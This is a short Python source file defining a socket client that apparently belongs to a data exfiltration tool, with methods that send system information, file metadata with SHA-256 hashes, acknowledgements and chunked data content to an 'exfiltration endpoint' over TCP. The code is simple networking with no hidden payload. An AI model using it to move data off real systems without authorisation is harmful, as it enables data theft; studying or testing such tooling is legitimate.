import socket

from dep_common.msg.MessageFactory import MessageFactory

class Client():
    def __init__(self, ip, port, pkgSize = 1321) -> None:
        self.ip = ip
        self.port = port
        self.pkgSize = pkgSize
        self.msgFactory = MessageFactory()

    # uuid - bytes - a uuid in bytes representation
    def sendSystemInformationMessage(self, uuid):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))
        # Create Message
        msg = self.msgFactory.createSystemInformationMessage(uuid, self.pkgSize)
        # Send Message and close connection
        s.sendall(msg)
        s.close()

    #        uuid - bytes - a uuid in bytes representation
    # sha256_hash - bytes - SHA256 hash in bytes of the data to be transfered
    #        path -   str - (for files)     path under which the data is located 
    #                       (for in memory) path under which the data is saved at exfiltration endpoint
    #        size -   int - size of data in bytes
    def sendDataInformationMessage(self, uuid, sha256_hash, path, size):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip, self.port))
        # Create Message
        msg = self.msgFactory.createDataInformationMessage(uuid, sha256_hash, path, size)
        # Send Message and close connection
        s.sendall(msg)
        s.close()

    #           s - socket - Socket to transfer data
    #        uuid -  bytes - A uuid in bytes representation
    # sha256_hash -  bytes - SHA256 hash in bytes of the data this message corresponds to
    #   dataState -    int - 0 = Data is not exfiltrated yet
    #                        1 = Data is already exfiltrated 
    #                        2 = Data available under given path but hash differs
    def sendDataAcknowledgeMessage(self, s, uuid, sha256_hash, dataState):
        # Create Message
        msg = self.msgFactory.createDataAcknowledgeMessage(uuid, sha256_hash, dataState)
        # Send Message
        s.sendall(msg)

    #           s - socket - Socket to transfer data
    #        uuid -  bytes - A uuid in bytes representation
    # sha256_hash -  bytes - SHA256 hash of the data to be transfered
    #       pkgNr -    int - Number of the package
    #        data -  bytes - Actual data content 
    def sendDataContentMessage(self, s, uuid, sha256_hash, pkgNr, data):
        # Create Message
        msg = self.msgFactory.createDataContentMessage(uuid, sha256_hash, pkgNr, data)
        # Send Message and close Connection
        s.sendall(msg)